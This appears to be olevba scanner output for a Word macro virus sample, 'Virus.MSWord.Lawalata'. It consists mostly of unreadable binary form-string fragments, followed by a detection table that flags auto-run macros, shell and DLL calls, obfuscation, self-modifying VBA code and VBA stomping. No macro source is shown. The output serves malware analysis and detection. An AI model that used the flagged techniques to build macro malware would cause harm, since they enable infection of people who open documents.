-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6�ûF��<�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~71DĦ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$䧒@��H�jV3�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��"*0���R�
V���d(�WV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�d�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���3֨�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ƒ�IC�.f0�x�c���Y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����,��+d�{�i�n��&@�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8�ec)чT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I2J�rE� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rX���d�ဋ�-*A� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ȀF@��J��k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"��di(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
27���T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ʌ�����LuC&m$r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�'��Xy����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1
Ud�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�v�d��2�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E5cu�)$ц-@@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���f7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�uD��ۆ^`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��΢K� H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��OL���P��U�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-[	�p@�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	^,�bc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Aj�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
⒪0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*U`%)A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~���h�r1�5�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��"��&��@�K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-[��9ȹU�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�z)4���v�aE��E��4ge
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.ɄdLH��P>Ҕ��f4٨�^��B�bE��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2;QB�I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͈�`A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�Ĺc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_LL�`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_��:�b���d�˕D`���h�HL빧
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p1��o�x���wv��)-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ṏX"��"De*�@C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kn#����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�D+Gl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ˆ��V�G��IC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<����/�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PO�ִP��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_��Bw�K�Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�W��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Σ�d�GقM�hE3P�̓�
E<Oq2%��`P\hIC�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F#,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���L4��5�B�,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T�,��[Cc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�JS�n�p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r:6��I>�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8�� B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f����l����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�?��A��H�N��KI���������>�jb���t�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?ƚ��F�ޕHB��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O���1%4�j���v�Vs^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0(�K�A��|�Y�mp��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
نܐ$$QmJ)����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�܀I6��c/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rc�i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FNL9�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]����`d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�Mt��П��� q�M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&"N��Y�Ѵ8�s+<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�~�e�6��<�*Z�����Ȧ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D��.$�37x��Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ӳ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[%"�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B��1�G�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�d��k>E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�G=r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��KR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��""b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�J��E�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2$<b$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�v��>��;+b0��"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�"� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r 	��#;�/m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

